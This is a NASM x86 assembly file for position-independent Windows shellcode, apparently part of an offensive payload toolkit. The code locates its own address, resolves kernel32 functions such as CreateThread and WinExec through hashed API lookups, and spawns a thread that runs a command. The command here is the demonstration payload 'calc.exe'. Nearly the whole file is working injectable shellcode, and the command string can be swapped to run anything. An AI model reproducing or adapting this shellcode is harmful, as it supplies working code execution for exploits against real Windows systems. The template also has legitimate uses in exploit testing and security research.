[ORG 0]
[BITS 32]

entry:
  ; store context
  push ebx                              ; store ebx

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; clear the direction flag
  cld

  ; ensure stack is 16 bytes aligned
  push edi                              ; store edi
  mov edi, esp                          ; store current stack to edi
  and edi, 0xF                          ; calculate the offset
  sub esp, edi                          ; adjust current stack

  ; call "kernel32.dll, CreateThread"
  push 0                                ; lpThreadId
  push 0                                ; dwCreationFlags
  push ebx                              ; lpParameter, set entry address
  lea ecx, [ebx+win_exec]               ; calculate function address
  push ecx                              ; lpStartAddress
  push 0                                ; dwStackSize
  push 0                                ; lpThreadAttributes
  push 0xE2C019B2                       ; set hash key
  push 0x2160C16A                       ; set function hash
  call api_call                         ; call api function

  ; call "kernel32.dll, WaitForSingleObject"
  push 1000                             ; set dwMilliseconds
  push eax                              ; set thread handle
  push 0x0F929559                       ; set hash key
  push 0x2811A50E                       ; set function hash
  call api_call                         ; call api function

  ; restore aligned stack
  add esp, edi                          ; restore stack from edi
  pop edi                               ; restore edi

  ; restore context
  pop ebx                               ; restore ebx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop eax                               ; get return address
  lea ebx, [eax-flag_CEA]               ; calculate entry address.
  push eax                              ; push return address
  ret                                   ; return to entry

; call "kernel32.dll, WinExec"
win_exec:
  push ebx                              ; store ebx
  mov ebx, ecx                          ; read entry address from ecx

  ; clear the direction flag
  cld

  ; ensure stack is 16 bytes aligned
  push edi                              ; store edi
  mov edi, esp                          ; store current stack to edi
  and edi, 0xF                          ; calculate the offset
  sub esp, edi                          ; adjust current stack

  lea edx, [ebx+command]                ; lpCmdLine
  xor ecx, ecx                          ; clear ecx
  mov cl, [ebx+cmd_show]                ; set uCmdShow
  push ecx                              ; push uCmdShow
  push edx                              ; push lpCmdLine
  push 0x61DA2999                       ; set hash key
  push 0x0AE20914                       ; set function hash
  call api_call                         ; call api function

  ; restore aligned stack
  add esp, edi                          ; restore stack from edi
  pop edi                               ; restore edi

  pop ebx                               ; restore ebx
  ret                                   ; exit thread

hash_api:
  %include "../../../src/x86/api_call.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
